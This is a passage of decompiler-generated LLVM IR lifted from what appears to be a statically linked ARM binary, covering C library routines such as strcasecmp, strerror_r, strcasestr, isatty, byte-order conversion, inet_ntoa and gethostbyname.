  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 25796), i32* @r2, align 4
  %v0_11eb8 = call i32 @strtok_r()
  ret i32 %v0_11eb8
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_11eec

dec_label_pc_11eec:                               ; preds = %dec_label_pc_11f18, %entry
  %v1_11f308 = phi i32 [ %v1_11f309, %dec_label_pc_11f18 ], [ 0, %entry ]
  %v0_11f20 = phi i32 [ %v1_11f20, %dec_label_pc_11f18 ], [ %arg2, %entry ]
  %v0_11f24 = phi i32 [ %v1_11f24, %dec_label_pc_11f18 ], [ %tmp, %entry ]
  %v9_11eec = icmp eq i32 %v0_11f24, %v0_11f20
  %.pre = inttoptr i32 %v0_11f24 to i8*
  br i1 %v9_11eec, label %dec_label_pc_11f18, label %dec_label_pc_11ef4

dec_label_pc_11ef4:                               ; preds = %dec_label_pc_11eec
  %v2_11ef4 = load i8, i8* %.pre, align 1
  %v3_11ef4 = zext i8 %v2_11ef4 to i32
  %v1_11ef8 = inttoptr i32 %v0_11f20 to i8*
  %v2_11ef8 = load i8, i8* %v1_11ef8, align 1
  %v3_11ef8 = zext i8 %v2_11ef8 to i32
  %v4_11efc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 1116) to i32*), align 4
  %v2_11f00 = mul nuw nsw i32 %v3_11ef8, 2
  %v2_11f04 = mul nuw nsw i32 %v3_11ef4, 2
  %v2_11f08 = add i32 %v4_11efc, %v2_11f00
  %v3_11f08 = inttoptr i32 %v2_11f08 to i16*
  %v4_11f08 = load i16, i16* %v3_11f08, align 2
  %v6_11f08 = sext i16 %v4_11f08 to i32
  %v2_11f0c = add i32 %v4_11efc, %v2_11f04
  %v3_11f0c = inttoptr i32 %v2_11f0c to i16*
  %v4_11f0c = load i16, i16* %v3_11f0c, align 2
  %v6_11f0c = sext i16 %v4_11f0c to i32
  %v2_11f10 = sub nsw i32 %v6_11f0c, %v6_11f08
  %v9_11f10 = icmp eq i16 %v4_11f0c, %v4_11f08
  br i1 %v9_11f10, label %dec_label_pc_11f18, label %dec_label_pc_11f2c

dec_label_pc_11f18:                               ; preds = %dec_label_pc_11eec, %dec_label_pc_11ef4
  %v1_11f309 = phi i32 [ %v2_11f10, %dec_label_pc_11ef4 ], [ %v1_11f308, %dec_label_pc_11eec ]
  %v2_11f18 = load i8, i8* %.pre, align 1
  %v2_11f1c = icmp eq i8 %v2_11f18, 0
  %v1_11f20 = add i32 %v0_11f20, 1
  %v1_11f24 = add i32 %v0_11f24, 1
  store i32 %v1_11f24, i32* @ip, align 4
  br i1 %v2_11f1c, label %dec_label_pc_11f2c, label %dec_label_pc_11eec

dec_label_pc_11f2c:                               ; preds = %dec_label_pc_11f18, %dec_label_pc_11ef4
  %v1_11f30 = phi i32 [ %v1_11f309, %dec_label_pc_11f18 ], [ %v2_11f10, %dec_label_pc_11ef4 ]
  ret i32 %v1_11f30

; uselistorder directives
  uselistorder i32 %v1_11f24, { 1, 0 }
  uselistorder i32 %v2_11f10, { 1, 0 }
  uselistorder i32 %v0_11f24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11f18, { 1, 0 }
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_11f3c = load i32, i32* @r4, align 4
  %v9_11f3c = load i32, i32* @r6, align 4
  %v0_11f44 = load i32, i32* @r0, align 4
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r6, align 4
  store i32 %v0_11f44, i32* @ip, align 4
  %v0_11f54 = load i32, i32* @r1, align 4
  store i32 %v0_11f54, i32* @r7, align 4
  %v0_11f58 = load i32, i32* @r2, align 4
  store i32 %v0_11f58, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_11f44, 124
  br i1 %tmp, label %dec_label_pc_11f90, label %dec_label_pc_11f60

dec_label_pc_11f60:                               ; preds = %entry
  br label %dec_label_pc_11f78

dec_label_pc_11f6c:                               ; preds = %dec_label_pc_11f78
  br i1 %v2_11f84, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_11f6c
  %v2_11f70 = add i32 %v1_11f88, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_11f6c, %bb
  %v0_11f781 = phi i32 [ %v1_11f88, %dec_label_pc_11f6c ], [ %v2_11f70, %bb ]
  %v1_11f74 = add i32 %v0_11f74, 1
  br label %dec_label_pc_11f78

dec_label_pc_11f78:                               ; preds = %dec_label_pc_11f60, %bb15
  %v1_11f88 = phi i32 [ %v0_11f44, %dec_label_pc_11f60 ], [ %v0_11f781, %bb15 ]
  %v0_11f74 = phi i32 [ add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 -38064), %dec_label_pc_11f60 ], [ %v1_11f74, %bb15 ]
  store i32 %v0_11f74, i32* @r5, align 4
  %v2_11f78 = icmp eq i32 %v1_11f88, 0
  %v1_11f7c = inttoptr i32 %v0_11f74 to i8*
  %v2_11f7c = load i8, i8* %v1_11f7c, align 1
  %v3_11f7c = zext i8 %v2_11f7c to i32
  store i32 %v3_11f7c, i32* @r3, align 4
  %v2_11f84 = icmp eq i8 %v2_11f7c, 0
  br i1 %v2_11f78, label %dec_label_pc_11f84, label %dec_label_pc_11f6c

dec_label_pc_11f84:                               ; preds = %dec_label_pc_11f78
  br i1 %v2_11f84, label %dec_label_pc_11f90, label %bb16

bb16:                                             ; preds = %dec_label_pc_11f84
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11fcc

dec_label_pc_11f90:                               ; preds = %dec_label_pc_11f84, %entry
  store i32 %v0_11f44, i32* @r2, align 4
  %v3_11f98 = ashr i32 %v0_11f44, 31
  store i32 %v3_11f98, i32* @r3, align 4
  %v6_11fac = bitcast i32* %stack_var_-25 to i8*
  %v7_11fac = call i32 @_uintmaxtostr(i8* %v6_11fac)
  %v1_11fb4 = add i32 %v7_11fac, -14
  store i32 %v1_11fb4, i32* @r5, align 4
  %v0_11fb8 = load i32, i32* @r6, align 4
  %v2_11fb8 = add i32 %v0_11fb8, -38080
  store i32 %v2_11fb8, i32* @r1, align 4
  store i32 %v1_11fb4, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_11fc4 = call i32 @memcpy()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_11fcc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11fcc

dec_label_pc_11fcc:                               ; preds = %bb16, %dec_label_pc_11f90
  %v0_11fcc = phi i32 [ %v0_11f74, %bb16 ], [ %v0_11fcc.pre, %dec_label_pc_11f90 ]
  %v1_11fcc = inttoptr i32 %v0_11fcc to i8*
  %v3_11fd0 = call i32 @strlen(i8* %v1_11fcc)
  %v0_11fd4 = load i32, i32* @r7, align 4
  %v2_11fd4 = icmp eq i32 %v0_11fd4, 0
  br i1 %v2_11fd4, label %bb17, label %dec_label_pc_11fcc._crit_edge

dec_label_pc_11fcc._crit_edge:                    ; preds = %dec_label_pc_11fcc
  %v1_11fe0.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_11fcc
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_11fcc._crit_edge, %bb17
  %v1_11fe0 = phi i32 [ %v1_11fe0.pre, %dec_label_pc_11fcc._crit_edge ], [ 0, %bb17 ]
  %v1_11fdc = add i32 %v3_11fd0, 1
  %v3_11fe0 = icmp uge i32 %v1_11fdc, %v1_11fe0
  %v9_11fe0 = icmp eq i32 %v1_11fdc, %v1_11fe0
  %v2_11fe4 = xor i1 %v3_11fe0, true
  %v3_11fe4 = or i1 %v9_11fe0, %v2_11fe4
  br i1 %v3_11fe4, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_11fdc, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_11ff4 = phi i32 [ %v1_11fe0, %bb18 ], [ %v1_11fdc, %bb19 ]
  %v2_11fe8 = xor i1 %v9_11fe0, true
  %v3_11fe8 = and i1 %v3_11fe0, %v2_11fe8
  br i1 %v3_11fe8, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_11fec = icmp eq i32 %v0_11ff4, 0
  br i1 %v2_11fec, label %dec_label_pc_12010, label %dec_label_pc_11ff4

dec_label_pc_11ff4:                               ; preds = %bb22
  store i32 %v0_11ff4, i32* @r2, align 4
  %v0_11ff8 = load i32, i32* @r5, align 4
  store i32 %v0_11ff8, i32* @r1, align 4
  store i32 %v0_11fd4, i32* @r0, align 4
  %v0_12000 = call i32 @memcpy()
  %v0_12004 = load i32, i32* @r4, align 4
  %v1_12004 = load i32, i32* @r7, align 4
  %v2_12004 = add i32 %v1_12004, %v0_12004
  %v3_1200c = add i32 %v2_12004, -1
  %v4_1200c = inttoptr i32 %v3_1200c to i8*
  store i8 0, i8* %v4_1200c, align 1
  br label %dec_label_pc_12010

dec_label_pc_12010:                               ; preds = %bb22, %dec_label_pc_11ff4
  %v0_12010 = load i32, i32* %r6.global-to-local, align 4
  %v2_12010 = icmp eq i32 %v0_12010, 0
  br i1 %v2_12010, label %dec_label_pc_12020, label %dec_label_pc_12018

dec_label_pc_12018:                               ; preds = %dec_label_pc_12010
  %v0_12018 = call i32 @__GI___errno_location()
  %v0_1201c = load i32, i32* %r6.global-to-local, align 4
  %v2_1201c = inttoptr i32 %v0_12018 to i32*
  store i32 %v0_1201c, i32* %v2_1201c, align 4
  %v0_12020.pre = load i32, i32* %r6.global-to-local, align 4
  %phitmp = mul i32 %v0_12020.pre, 65536
  %phitmp23 = sdiv i32 %phitmp, 65536
  br label %dec_label_pc_12020

dec_label_pc_12020:                               ; preds = %dec_label_pc_12010, %dec_label_pc_12018
  %v0_12020 = phi i32 [ 0, %dec_label_pc_12010 ], [ %phitmp23, %dec_label_pc_12018 ]
  store i32 %v3_11f3c, i32* @r4, align 4
  store i32 %v9_11f3c, i32* %r6.global-to-local, align 4
  ret i32 %v0_12020

; uselistorder directives
  uselistorder i1 %v3_11fe0, { 1, 0 }
  uselistorder i32 %v0_11f74, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11f88, { 1, 0, 2 }
  uselistorder i32 %v0_11f44, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_12020, { 1, 0 }
  uselistorder label %dec_label_pc_12010, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_11fcc, { 1, 0 }
  uselistorder label %dec_label_pc_11f78, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_12048 = load i32, i32* %r0.global-to-local, align 4
  %v1_1205c23 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_1205c.outer

dec_label_pc_1205c.outer:                         ; preds = %dec_label_pc_1209c, %entry
  %v0_1209c.ph = phi i32 [ %v1_1209c, %dec_label_pc_1209c ], [ %v0_12048, %entry ]
  %v2_1205c24 = load i8, i8* %v1_1205c23, align 1
  %v2_1206026 = icmp eq i8 %v2_1205c24, 0
  br i1 %v2_1206026, label %bb, label %dec_label_pc_12074

bb:                                               ; preds = %dec_label_pc_1205c.backedge, %dec_label_pc_1205c.outer
  store i32 %v0_1209c.ph, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_120b0

dec_label_pc_12074:                               ; preds = %dec_label_pc_1205c.outer, %dec_label_pc_1205c.backedge
  %v1_1206832.in = phi i32 [ %v1_1206832, %dec_label_pc_1205c.backedge ], [ %arg2, %dec_label_pc_1205c.outer ]
  %v2_1205c30 = phi i8 [ %v2_1205c, %dec_label_pc_1205c.backedge ], [ %v2_1205c24, %dec_label_pc_1205c.outer ]
  %v2_1206431.in.in = phi i8 [ %v2_1205c, %dec_label_pc_1205c.backedge ], [ %v2_1205c24, %dec_label_pc_1205c.outer ]
  %v0_1208029 = phi i32 [ %v1_12080, %dec_label_pc_1205c.backedge ], [ %v0_1209c.ph, %dec_label_pc_1205c.outer ]
  %v1_1206832 = add i32 %v1_1206832.in, 1
  %v1_12074 = inttoptr i32 %v0_1208029 to i8*
  %v2_12074 = load i8, i8* %v1_12074, align 1
  %v3_12074 = zext i8 %v2_12074 to i32
  store i32 %v3_12074, i32* %r0.global-to-local, align 4
  %v9_12078 = icmp eq i8 %v2_1205c30, %v2_12074
  %v1_12080 = add i32 %v0_1208029, 1
  br i1 %v9_12078, label %dec_label_pc_1205c.backedge, label %dec_label_pc_12088

dec_label_pc_1205c.backedge:                      ; preds = %dec_label_pc_12074, %dec_label_pc_12088
  %v1_1205c = inttoptr i32 %v1_1206832 to i8*
  %v2_1205c = load i8, i8* %v1_1205c, align 1
  %v2_12060 = icmp eq i8 %v2_1205c, 0
  br i1 %v2_12060, label %bb, label %dec_label_pc_12074

dec_label_pc_12088:                               ; preds = %dec_label_pc_12074
  %v2_1206431.in = zext i8 %v2_1206431.in.in to i32
  %v2_1207c = mul nuw nsw i32 %v3_12074, 2
  %v2_1206431 = mul nuw nsw i32 %v2_1206431.in, 2
  %v4_12088 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 1116) to i32*), align 4
  %v2_1208c = add i32 %v4_12088, %v2_1207c
  %v3_1208c = inttoptr i32 %v2_1208c to i16*
  %v4_1208c = load i16, i16* %v3_1208c, align 2
  %v2_12090 = add i32 %v4_12088, %v2_1206431
  %v3_12090 = inttoptr i32 %v2_12090 to i16*
  %v4_12090 = load i16, i16* %v3_12090, align 2
  %v9_12094 = icmp eq i16 %v4_12090, %v4_1208c
  br i1 %v9_12094, label %dec_label_pc_1205c.backedge, label %dec_label_pc_1209c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_12088
  %v1_1209c = add i32 %v0_1209c.ph, 1
  %v2_120a0 = icmp eq i8 %v2_12074, 0
  br i1 %v2_120a0, label %dec_label_pc_120b0, label %dec_label_pc_1205c.outer

dec_label_pc_120b0:                               ; preds = %dec_label_pc_1209c, %bb
  %v1_120b4 = phi i32 [ %v0_1209c.ph, %bb ], [ 0, %dec_label_pc_1209c ]
  ret i32 %v1_120b4

; uselistorder directives
  uselistorder i8 %v2_1205c, { 2, 1, 0 }
  uselistorder i32 %v0_1208029, { 1, 0 }
  uselistorder i32 %v0_1209c.ph, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1205c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_12074, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_120c8 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_120c8, i32* @r1, align 4
  %v0_120cc = call i32 @__GI_tcgetattr()
  %v1_120d0 = sub i32 1, %v0_120cc
  %v2_120d0 = icmp ult i32 %v0_120cc, 2
  br i1 %v2_120d0, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_120e0 = phi i32 [ %v1_120d0, %entry ], [ 0, %bb ]
  ret i32 %v1_120e0

; uselistorder directives
  uselistorder i32 %v0_120cc, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_3()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_120e4 = load i32, i32* @r4, align 4
  %v6_120e4 = load i32, i32* @r5, align 4
  %v2_120ec = ptrtoint i32* %stack_var_-52 to i32
  %v0_120f0 = load i32, i32* @r1, align 4
  store i32 %v0_120f0, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_120fc = load i32, i32* @r0, align 4
  %v3_120fc = call i32 @ioctl(i32 %v0_120fc, i32 21505, i32 %v2_120ec)
  store i32 %v3_120fc, i32* %r0.global-to-local, align 4
  store i32 %v3_120fc, i32* @r5, align 4
  %v2_12100 = icmp eq i32 %v3_120fc, 0
  br i1 %v2_12100, label %dec_label_pc_12108, label %dec_label_pc_1214c

dec_label_pc_12108:                               ; preds = %entry
  %v4_12114 = zext i8 %tmp to i32
  store i32 %v4_12114, i32* @ip, align 4
  %v3_12118 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_12118, i32* @r3, align 4
  %v1_1211c = load i32, i32* @r4, align 4
  %v2_1211c = add i32 %v1_1211c, 4
  %v3_1211c = inttoptr i32 %v2_1211c to i32*
  %v0_12120 = load i32, i32* %r1.global-to-local, align 4
  %v1_12120 = load i32, i32* @r4, align 4
  %v2_12120 = add i32 %v1_12120, 8
  %v3_12120 = inttoptr i32 %v2_12120 to i32*
  store i32 %v0_12120, i32* %v3_12120, align 4
  %v0_12124 = load i32, i32* %r0.global-to-local, align 4
  %v1_12124 = load i32, i32* @r4, align 4
  %v2_12124 = add i32 %v1_12124, 12
  %v3_12124 = inttoptr i32 %v2_12124 to i32*
  store i32 %v0_12124, i32* %v3_12124, align 4
  %v2_12128 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_12128, i32* @r1, align 4
  %v1_12130 = load i32, i32* @r4, align 4
  %v2_12130 = inttoptr i32 %v1_12130 to i32*
  store i32 %v3_12118, i32* %v2_12130, align 4
  %v0_12134 = load i32, i32* @ip, align 4
  %v1_12134 = trunc i32 %v0_12134 to i8
  %v2_12134 = load i32, i32* @r4, align 4
  %v3_12134 = add i32 %v2_12134, 16
  %v4_12134 = inttoptr i32 %v3_12134 to i8*
  store i8 %v1_12134, i8* %v4_12134, align 1
  %v0_12138 = load i32, i32* @r4, align 4
  %v1_12138 = add i32 %v0_12138, 17
  store i32 %v1_12138, i32* %r0.global-to-local, align 4
  %v4_1213c = call i32 @__GI_mempcpy(i32 %v1_12138, i32 %v2_12128, i32 19, i32 %v3_12118)
  store i32 %v4_1213c, i32* %r0.global-to-local, align 4
  %v0_12140 = load i32, i32* @r5, align 4
  store i32 %v0_12140, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_12148 = inttoptr i32 %v4_1213c to i8*
  %v3_12148 = call i32 @__GI_memset(i8* %v2_12148, i32 %v0_12140)
  store i32 %v3_12148, i32* %r0.global-to-local, align 4
  %v0_1214c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1214c

dec_label_pc_1214c:                               ; preds = %entry, %dec_label_pc_12108
  %v0_1214c = phi i32 [ %v3_120fc, %entry ], [ %v0_1214c.pre, %dec_label_pc_12108 ]
  store i32 %v0_1214c, i32* %r0.global-to-local, align 4
  store i32 %v3_120e4, i32* @r4, align 4
  store i32 %v6_120e4, i32* @r5, align 4
  ret i32 %v0_1214c

; uselistorder directives
  uselistorder i32 %v0_1214c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_1214c, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_12160 = udiv i32 %arg1, 256
  %v1_12164 = mul i32 %arg1, 256
  %v4_12168 = and i32 %v1_12164, 65280
  %v5_12168 = or i32 %v4_12168, %v3_12160
  ret i32 %v5_12168
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_12188 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_12188
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_12190 = udiv i32 %arg1, 256
  %v1_12194 = mul i32 %arg1, 256
  %v4_12198 = and i32 %v1_12194, 65280
  %v5_12198 = or i32 %v4_12198, %v3_12190
  ret i32 %v5_12198
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_121b8 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_121b8
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %v3_121c0 = load i32, i32* @r4, align 4
  %v6_121c0 = load i32, i32* @r5, align 4
  %v9_121c0 = load i32, i32* @r6, align 4
  %v12_121c0 = load i32, i32* @r7, align 4
  %v15_121c0 = load i32, i32* @r8, align 4
  %v18_121c0 = load i32, i32* @sb, align 4
  %v21_121c0 = load i32, i32* @sl, align 4
  %v24_121c0 = load i32, i32* @fp, align 4
  %v0_121c4 = load i32, i32* @r0, align 4
  %v5_121e0 = call i32 @llvm.bswap.i32(i32 %v0_121c4)
  %v0_121e4 = load i32, i32* @r1, align 4
  %v1_121e4 = add i32 %v0_121e4, 15
  store i32 %v1_121e4, i32* @r1, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_12220

dec_label_pc_12204:                               ; preds = %dec_label_pc_12220
  %v1_1220c = inttoptr i32 %v0_1223c to i8*
  %v2_1220c = call i32 @_uintmaxtostr(i8* %v1_1220c)
  %v0_12210 = load i32, i32* @r6, align 4
  %v2_12210 = icmp eq i32 %v0_12210, 0
  %v1_12214 = add i32 %v2_1220c, -1
  store i32 %v1_12214, i32* @r1, align 4
  br i1 %v2_12210, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_12204
  %v1_12218 = load i32, i32* @sl, align 4
  %v2_12218 = trunc i32 %v1_12218 to i8
  %v4_12218 = inttoptr i32 %v0_12210 to i8*
  store i8 %v2_12218, i8* %v4_12218, align 1
  %v0_1221c.pre = load i32, i32* @r1, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12204, %bb
  %v0_1221c = phi i32 [ %v1_12214, %dec_label_pc_12204 ], [ %v0_1221c.pre, %bb ]
  store i32 %v0_1221c, i32* @r6, align 4
  %v0_12220.pre = load i32, i32* @r5, align 4
  %v0_12224.pre = load i32, i32* @r7, align 4
  %v1_12224.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12220

dec_label_pc_12220:                               ; preds = %entry, %bb17
  %v0_1223c = phi i32 [ %v1_121e4, %entry ], [ %v0_1221c, %bb17 ]
  %v1_12224 = phi i32 [ %v5_121e0, %entry ], [ %v1_12224.pre, %bb17 ]
  %v0_12224 = phi i32 [ 255, %entry ], [ %v0_12224.pre, %bb17 ]
  %v0_12234 = phi i32 [ 0, %entry ], [ %v0_12220.pre, %bb17 ]
  %v7_12220 = icmp eq i32 %v0_12234, 3
  store i1 %v7_12220, i1* @cpsr_z, align 1
  %v2_12224 = and i32 %v0_12224, %v1_12224
  store i32 %v2_12224, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_12230 = udiv i32 %v1_12224, 256
  store i32 %v3_12230, i32* @r4, align 4
  %v1_12234 = add i32 %v0_12234, 1
  store i32 %v1_12234, i32* @r5, align 4
  %v7_12238 = icmp sgt i32 %v0_12234, 3
  br i1 %v7_12238, label %dec_label_pc_1223c, label %dec_label_pc_12204

dec_label_pc_1223c:                               ; preds = %dec_label_pc_12220
  %v1_1223c = add i32 %v0_1223c, 1
  store i32 %v3_121c0, i32* @r4, align 4
  store i32 %v6_121c0, i32* @r5, align 4
  store i32 %v9_121c0, i32* @r6, align 4
  store i32 %v12_121c0, i32* @r7, align 4
  store i32 %v15_121c0, i32* @r8, align 4
  store i32 %v18_121c0, i32* @sb, align 4
  store i32 %v21_121c0, i32* @sl, align 4
  store i32 %v24_121c0, i32* @fp, align 4
  ret i32 %v1_1223c

; uselistorder directives
  uselistorder i32 %v0_12234, { 2, 0, 1 }
  uselistorder i32 %v0_1221c, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12220, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 25800), i32* @r1, align 4
  %v0_1225c = call i32 @__GI_inet_ntoa_r()
  %v0_12260 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12260, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_12260 = load i32, i32* @r3, align 4
  %v2_12260 = trunc i32 %v1_12260 to i16
  %v3_12260 = load i32, i32* @r1, align 4
  %v4_12260 = inttoptr i32 %v3_12260 to i16*
  store i16 %v2_12260, i16* %v4_12260, align 2
  %v2_12264 = load i32, i32* @r8, align 4
  %v5_12264 = sdiv i32 %v2_12264, 512
  %v6_12264 = and i32 %v5_12264, %v0_1225c
  store i32 %v6_12264, i32* @r6, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v0_1225c

; uselistorder directives
  uselistorder i32 %v0_1225c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_12270 = ptrtoint i32* %stack_var_-12 to i32
  %v0_12274 = load i32, i32* @r0, align 4
  %v2_12274 = inttoptr i32 %v0_12274 to i8*
  %v3_12274 = call i32 @inet_aton(i8* %v2_12274, i32 %v2_12270)
  %v2_12278 = icmp eq i32 %v3_12274, 0
  %v4_1227c = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_12278, i32 -1, i32 %v4_1227c
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_1229c = call i32 @__GI_gethostbyname2()
  ret i32 %v0_1229c
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_122ac = load i32, i32* @r4, align 4
  %v6_122ac = load i32, i32* @r5, align 4
  %v0_122b4 = load i32, i32* @r0, align 4
  store i32 %v0_122b4, i32* @r4, align 4
  %v0_122b8 = load i32, i32* @r1, align 4
  store i32 %v0_122b8, i32* @r5, align 4
  %v0_122bc = call i32 @__GI___h_errno_location()
  %v0_122e4 = load i32, i32* @r4, align 4
  %v2_122e8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_122e8, i32* @ip, align 4
  %v0_122ec = load i32, i32* @r5, align 4
  %v8_122f4 = call i32 @gethostbyname2_r(i32 %v0_122e4, i32 %v0_122ec, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 26256) to i32*), i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 25816), i32 440, i32 %v2_122e8, i32 %v0_122bc)
  %v3_122f8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_122ac, i32* @r4, align 4
  store i32 %v6_122ac, i32* @r5, align 4
  ret i32 %v3_122f8
}

define i32 @function_1230c(i64* %arg1) local_unnamed_addr {
dec_label_pc_1230c:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_1230c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1230c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1230c
  %v3_1230c = load i64, i64* %arg1, align 4
  %v4_1230c = load i32, i32* @r8, align 4
  %v6_1230c = udiv i64 %v3_1230c, 4294967296
  %v7_1230c = trunc i64 %v6_1230c to i32
  %v9_1230c = sub i32 %tmp, %v4_1230c
  %v3_12310 = mul i32 %v7_1230c, %v9_1230c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1230c, %bb
  %v4_12310 = phi i32 [ %tmp, %dec_label_pc_1230c ], [ %v3_12310, %bb ]
  ret i32 %v4_12310

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12314 = load i32, i32* @r7, align 4
  store i32 %v3_12314, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1233c, label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %entry
  %v0_1232c = call i32 @__GI___errno_location()
  %v0_12330 = load i32, i32* %r7.global-to-local, align 4
  %v1_12330 = sub i32 0, %v0_12330
  %v2_12334 = inttoptr i32 %v0_1232c to i32*
  store i32 %v1_12330, i32* %v2_12334, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12340.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1233c

dec_label_pc_1233c:                               ; preds = %entry, %dec_label_pc_1232c
  %v2_12340 = phi i32 [ %v3_12314, %entry ], [ %v2_12340.pre, %dec_label_pc_1232c ]
  %v0_1233c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1232c ]
  store i32 %v2_12340, i32* @r7, align 4
  ret i32 %v0_1233c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
